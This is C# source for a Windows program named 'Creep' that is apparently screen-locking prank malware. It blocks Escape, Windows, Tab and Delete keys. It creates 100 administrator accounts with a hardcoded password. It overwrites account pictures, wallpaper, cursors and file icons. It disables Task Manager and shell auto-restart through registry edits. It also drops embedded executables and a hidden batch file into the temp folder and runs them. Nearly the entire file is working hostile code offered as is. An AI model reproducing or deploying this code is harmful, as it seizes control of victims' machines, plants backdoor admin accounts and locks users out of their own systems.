using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using Utilities;

namespace Creep
{

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        GlobalKeyboardHook gkh;

        public MainWindow()
        {
            Console.WriteLine("beginning!");

            gkh = new GlobalKeyboardHook();
            gkh.HookedKeys.Add(Keys.Escape);
            gkh.HookedKeys.Add(Keys.LWin);
            gkh.HookedKeys.Add(Keys.RWin);
            gkh.HookedKeys.Add(Keys.Tab);
            gkh.HookedKeys.Add(Keys.Delete);

            gkh.KeyDown += new KeyEventHandler(handleKey);
            gkh.hook();

            createUser();
            WorkWorkWorkWork();

            InitializeComponent();
        }

        private void handleKey(object sender, KeyEventArgs e)
        {
            e.Handled = true;
        }

        private void main_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            e.Handled = true;
        }

        public void WorkWorkWorkWork()
        {
            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user-192.png");
            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user-32.png");
            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user-40.png");
            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user-48.png");
            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user.png");
            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user.bmp");
            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\guest.png");
            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\guest.bmp");
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user-32.png", Properties.Resources.ht);
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user-40.png", Properties.Resources.ht);
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user-48.png", Properties.Resources.ht);
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user-192.png", Properties.Resources.ht);
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\guest.png", Properties.Resources.ht);
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\guest.bmp", Properties.Resources.ht);
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user.bmp", Properties.Resources.ht);
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user.png", Properties.Resources.ht);
            string temp = System.IO.Path.GetTempPath();
            System.IO.File.WriteAllBytes(@"C:\Windows\" + "icon.ico", Properties.Resources.texticon);
            System.IO.File.WriteAllBytes(@"C:\Windows\" + "cursor_ht.cur", Properties.Resources.cs);

            RegistryKey editKey;
            
            editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            editKey.SetValue("", @"C:\Windows\" + "icon.ico");
            editKey.Close();

            editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
            editKey.SetValue("Arrow", @"C:\Windows\" + "cursor_ht.cur");
            editKey.SetValue("Hand", @"C:\Windows\" + "cursor_ht.cur");
            editKey.SetValue("Wait", @"C:\Windows\" + "cursor_ht.cur");
            editKey.Close();

            editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            editKey.SetValue("UseDefaultTile", "1", RegistryValueKind.DWord);
            editKey.Close();

            editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
            editKey.SetValue("Wallpaper", @"C:\Windows\ht.jpg");
            editKey.Close();

            editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            editKey.SetValue("DisableTaskMgr", "1");
            editKey.Close();

            editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
            editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
            editKey.Close();

            System.IO.File.WriteAllBytes(temp + "text.txt", Properties.Resources.txt);
            System.IO.File.WriteAllBytes(temp + "windl.bat", Properties.Resources.windl);
            System.IO.File.WriteAllBytes(temp + "one.rtf", Properties.Resources.one);
            System.IO.File.WriteAllBytes(temp + "ht.exe", Properties.Resources.subox);
            System.IO.File.WriteAllBytes(temp + "ht_msg.exe", Properties.Resources.ht_msg);
            System.IO.File.WriteAllBytes(@"C:\Windows\" + "ht.jpg", Properties.Resources.ht);

            ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }

        private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
        {
            MediaElement i = sender as MediaElement;
            i.Position = TimeSpan.FromMilliseconds(1);
        }

        private void video_Loaded(object sender, RoutedEventArgs e)
        {
            string videopath = System.IO.Path.GetTempPath() + "v.mp4";
            System.IO.File.WriteAllBytes(videopath, Properties.Resources.street);

            video.Source = new Uri(videopath);
        }
        public static void createUser()
        {


            for (int i = 1; i <= 100; i++)
            {
                try
                {
                    DirectoryEntry AD = new DirectoryEntry("WinNT://" +
                                        Environment.MachineName + ",computer");
                    DirectoryEntry NewUser = AD.Children.Add("Hung To " + i.ToString(), "user");
                    NewUser.Invoke("SetPassword", new object[] { "buta-1,3-dien" });
                    NewUser.Invoke("Put", new object[] { "Description", "Hung To giau ngau" });
                    NewUser.CommitChanges();
                    DirectoryEntry grp;

                    grp = AD.Children.Find("Administrators", "group");
                    if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                }
                catch (Exception ex)
                {

                }
            }
        }
    }
}
